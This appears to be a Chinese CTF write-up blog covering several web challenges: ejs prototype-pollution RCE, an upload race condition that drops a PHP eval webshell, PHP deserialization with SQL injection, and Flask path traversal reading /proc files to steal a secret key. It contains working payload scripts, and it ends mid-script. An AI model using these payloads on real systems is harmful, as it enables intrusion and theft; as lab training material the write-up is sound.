<p>这个漏洞大概就是向 ejs 文件提交post 请求，用bp 抓包，并将提交的字段名改为__proto__.outputFunctionName，对应的字段值改为x;console.log(1);process.mainModule.require(‘child_process’).exec(‘ls’);x ，便可以控制服务器的shell</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230101201952010.png" alt="image-20230101201952010"></p>
<p>通过污染ejs中outputFunctionName变量，实现RCE：</p>
<p>写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">resp1 = requests.post(<span class="string">&quot;http://223.112.5.156:58367/4_pATh_y0u_CaNN07_Gu3ss&quot;</span>,</span><br><span class="line">        files=&#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>:</span><br><span class="line">        (</span><br><span class="line">            <span class="literal">None</span>, <span class="string">&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;cp /flag.txt /app/static/js/flag.txt&#x27;);x&quot;</span></span><br><span class="line">        )&#125;)</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230101203240663.png" alt="image-20230101203240663"></p>
<h2 id="50-wzsc-文件上传"><a href="#50-wzsc-文件上传" class="headerlink" title="50.wzsc_文件上传"></a>50.wzsc_文件上传</h2><p>上传一个jpg文件，burp抓包，然后修改文件后缀名为php,没有返回文件存储路径</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230102205031184.png" alt="image-20230102205031184"></p>
<p>这时候可以猜测文件路径有可能为<br><a target="_blank" rel="noopener" href="http://ip/upload/">http://ip/upload/</a></p>
<p>访问</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230102205141819.png" alt="image-20230102205141819"></p>
<p>只得到一个jpg文件，说明可能存在白名单</p>
<p>扫描目录，看是否有相关文件代码提示，发现并没有源码</p>
<p>根据刚才上传的操作来看，一句话木马就直接删除不存在，那么极大可能存在检测机制，那么我们可以想到这极有可能是典型的文件上传之条件竞争，那么我们直接开始尝试。<br>条件竞争原理：我们成功上传了php文件，服务端会在短时间内将其删除，我们需要抢到在它删除之前访问文件并生成一句话木马文件，所以访问包的线程需要稍微大于上传包的线程。</p>
<p>抓取文件上传包，上传包上传文件为生成一句话木马文件，设置nullpayload</p>
<p>php代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;heihei.php&quot;</span>, <span class="string">&quot;w&quot;</span>), <span class="string">&#x27;&lt;?php @eval($_POST[&quot;heihei&quot;]); ?&gt;&#x27;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230102210111411.png" alt="image-20230102210111411"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230102205511098.png" alt="image-20230102205511098"></p>
<p>抓取文件路径，访问文件</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230102210413340.png" alt="image-20230102210413340"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230102210511452.png" alt="image-20230102210511452"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230102210528420.png" alt="image-20230102210528420"></p>
<p>开始跑包，然后访问存储路径看是否成功生成一句话木马文件，如果实战中没有目录遍历的话需要看访问包是否是200的状态码。</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230102212351254.png" alt="image-20230102212351254"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230102212408927.png" alt="image-20230102212408927"></p>
<p>接着用webshell工具连接，寻找flag就可以啦</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230102212657772.png" alt="image-20230102212657772"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230102212706970.png" alt="image-20230102212706970"></p>
<h2 id="51-题目名称-warmup"><a href="#51-题目名称-warmup" class="headerlink" title="51.题目名称-warmup"></a>51.题目名称-warmup</h2><p>题目附件给了源码，和一些其他文件</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;last_login_info&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">//cookie传参,需要抓包修改cookie</span></span><br><span class="line">    <span class="variable">$last_login_info</span> = <span class="title function_ invoke__">unserialize</span> (<span class="title function_ invoke__">base64_decode</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;last_login_info&#x27;</span>]));</span><br><span class="line">    <span class="comment">//base64编码，加序列化。需要先base64解码，然后反序列化</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$last_login_info</span>) &amp;&amp; <span class="variable">$last_login_info</span>[<span class="string">&#x27;ip&#x27;</span>] != <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;WAF info: your ip status has been changed, you are dangrous.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$cookie</span> = <span class="title function_ invoke__">base64_encode</span> (<span class="title function_ invoke__">serialize</span> (<span class="keyword">array</span> ( <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]))) ;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span> (<span class="string">&#x27;last_login_info&#x27;</span>, <span class="variable">$cookie</span>, <span class="title function_ invoke__">time</span> () + (<span class="number">86400</span> * <span class="number">30</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line">	<span class="variable">$username</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">    <span class="comment">//函数的作用是在预定义的字符前面加上反斜杠</span></span><br><span class="line">	<span class="variable">$password</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">	<span class="variable">$sql</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SQL</span>();</span><br><span class="line">	<span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">	<span class="variable">$sql</span>-&gt;table = <span class="variable">$table</span>;</span><br><span class="line">    <span class="variable">$sql</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">    <span class="variable">$sql</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    <span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">check_login</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>conn.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">SQL</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$table</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$conn</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;xxxxx&quot;</span>, <span class="string">&quot;xxxx&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">query</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;database error, please check your input&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="comment">//fetch_assoc()从结果集中取得一行作为关联数组</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span> === <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;username or password incorrect!&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;welcome, admin! this is your flag -&gt; &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;welcome! but you are not admin&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">waf</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span> (<span class="string">&quot;select username,password from &quot;</span>.<span class="variable">$this</span>-&gt;table.<span class="string">&quot; where username=&#x27;&quot;</span>.<span class="variable">$this</span>-&gt;username.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    	<span class="variable">$blacklist</span> = [<span class="string">&quot;union&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;@&quot;</span>, <span class="string">&quot;[&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;]&quot;</span> , <span class="string">&quot;*&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>];</span><br><span class="line">    	<span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">    		<span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$value</span>))&#123;</span><br><span class="line">                <span class="comment">//strripos() 函数查找字符串在另一字符串中最后一次出现的位置。 注：strripos() 函数对大小写不敏感</span></span><br><span class="line">    			<span class="keyword">die</span>(<span class="string">&#x27;bad hacker,go out!&#x27;</span>);</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$value</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;bad hacker,go out!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$this</span>-&gt;password, <span class="variable">$value</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;bad hacker,go out!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="variable language_">$this</span>-&gt;conn)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span> ();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;table)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">waf</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_login</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>先是构造序列化的字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class SQL &#123;</span><br><span class="line">&#125;</span><br><span class="line">$sql = new SQL();</span><br><span class="line">$sql-&gt;table = &#x27;users&#x27;;</span><br><span class="line">$sql-&gt;username = &#x27;&#x27;;</span><br><span class="line">$sql-&gt;password = &quot;&#x27; or &#x27;1&#x27;=&#x27;1&quot;;</span><br><span class="line">$poc = array($sql,1);</span><br><span class="line">echo base64_encode(str_replace(&#x27;i:1&#x27;,&#x27;i:0&#x27;,serialize($poc)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YToyOntpOjA7TzozOiJTUUwiOjM6e3M6NToidGFibGUiO3M6NToidXNlcnMiO3M6ODoidXNlcm5hbWUiO3M6MDoiIjtzOjg6InBhc3N3b3JkIjtzOjExOiInIG9yICcxJz0nMSI7fWk6MDtpOjA7fQ==</span><br></pre></td></tr></table></figure>

<p>打开网页</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230105232617592.png" alt="image-20230105232617592"></p>
<p>burp抓包</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230105232638211.png" alt="image-20230105232638211"></p>
<p>修改cookie</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230105235817950.png" alt="image-20230105235817950"></p>
<p>登陆成功</p>
<p>查看源码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230105235926340.png" alt="image-20230105235926340"></p>
<h2 id="52-catcat-new"><a href="#52-catcat-new" class="headerlink" title="52.catcat-new"></a>52.catcat-new</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230122221220881.png" alt="image-20230122221220881"></p>
<p>点击猫下面的文字，跳转</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230122221251746.png" alt="image-20230122221251746"></p>
<p>看url</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:59538/info?file=ForestCat.txt</span><br></pre></td></tr></table></figure>

<p>可能存在文件读取</p>
<p>如果一时半会不知道要读取什么，就先读linux系统都有的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:59538/info?file=…/…/…/…/…/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230122221647234.png" alt="image-20230122221647234"></p>
<p>发现存在漏洞</p>
<p>下一步是读取网站源码。在info界面抓个包，发现服务器是python。既然是python，当前进程肯定是由<code>python xxx.py</code>启动的，只要能知道当时的命令是什么，就能获取xxx.py的名字，进而读取源码。linux确实有这么个文件，<code>/proc/self/cmdline</code>，用于获取当前启动进程的完整命令。</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230122221908547.png" alt="image-20230122221908547"></p>
<p>大部分的python网站脚本名都是app.py。</p>
<p>不过肯定不是当前路径，那就往上看，正好在上一个目录。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, Markup</span><br><span class="line"><span class="keyword">from</span> cat <span class="keyword">import</span> cat</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">app = Flask(</span><br><span class="line"> __name__,</span><br><span class="line"> static_url_path=<span class="string">&#x27;/&#x27;</span>, </span><br><span class="line"> static_folder=<span class="string">&#x27;static&#x27;</span> </span><br><span class="line">)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;*abcdefgh&quot;</span> <span class="comment">#SECRET_KEY为uuid替换-为空后加上*abcdefgh。这里刻意的*abcdefgh是在提示我们secret key的格式</span></span><br><span class="line"><span class="keyword">if</span> os.path.isfile(<span class="string">&quot;/flag&quot;</span>):</span><br><span class="line"> flag = cat(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line"> os.remove(<span class="string">&quot;/flag&quot;</span>) <span class="comment">#这里读取flag后删掉了flag，防止之前任意文件读取出非预期解</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"> detailtxt = os.listdir(<span class="string">&#x27;./details/&#x27;</span>)</span><br><span class="line"> cats_list = []</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> detailtxt:</span><br><span class="line"> cats_list.append(i[:i.index(<span class="string">&#x27;.&#x27;</span>)])</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, cats_list=cats_list, cat=cat)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/info&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line"> filename = <span class="string">&quot;./details/&quot;</span> + request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"> start = request.args.get(<span class="string">&#x27;start&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"> end = request.args.get(<span class="string">&#x27;end&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"> name = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)[:request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>).index(<span class="string">&#x27;.&#x27;</span>)]</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">return</span> render_template(<span class="string">&quot;detail.html&quot;</span>, catname=name, info=cat(filename, start, end)) <span class="comment">#cat是上面引用进来的函数</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_can_list_root</span>():</span><br><span class="line"> <span class="keyword">if</span> session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>: <span class="comment">#session为admin就能得到flag，此处需要session伪造</span></span><br><span class="line"> <span class="keyword">return</span> flag</span><br><span class="line"> <span class="keyword">else</span>:</span><br><span class="line"> session[<span class="string">&#x27;admin&#x27;</span>] = <span class="number">0</span></span><br><span class="line"> <span class="keyword">return</span> <span class="string">&quot;NoNoNo&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">5637</span>)</span><br></pre></td></tr></table></figure>

<p>python存储对象的位置在堆上。app是个Flask对象，而secret key在app.config[‘SECRET_KEY’]，读取&#x2F;proc&#x2F;self&#x2F;mem得到进程的内存内容，进而获取到SECRET_KEY。不过读&#x2F;proc&#x2F;self&#x2F;mem前要注意，&#x2F;proc&#x2F;self&#x2F;mem内容较多而且存在不可读写部分，直接读取会导致程序崩溃，因此需要搭配&#x2F;proc&#x2F;self&#x2F;maps获取堆栈分布，结合maps的映射信息来确定读的偏移值</p>
<p>这里直接放出大佬读取&#x2F;proc&#x2F;self&#x2F;maps+&#x2F;proc&#x2F;self&#x2F;mem+SECRET_KEY的脚本，可一键获取flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 